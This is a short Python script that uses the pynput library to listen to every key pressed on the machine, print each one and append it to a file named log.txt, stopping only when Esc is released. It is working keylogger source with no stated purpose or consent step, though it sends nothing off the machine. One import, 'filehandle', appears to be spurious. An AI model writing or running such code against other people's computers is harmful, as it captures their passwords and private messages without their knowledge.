import filehandle as filehandle
import pynput
import os

from pynput.keyboard import Key, Listener


def on_press(key):
    print("{0} pressed".format(key))
    write_file(key)


def write_file(key):
    alr = 0
    with open("log.txt", "a") as f:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            f.write(' ')
        elif k.find('enter') > 0:
            f.write('\n')
        elif k.find('backspace') > 0:
            f.write("\b")
        elif k.find("Key") == -1:
            f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
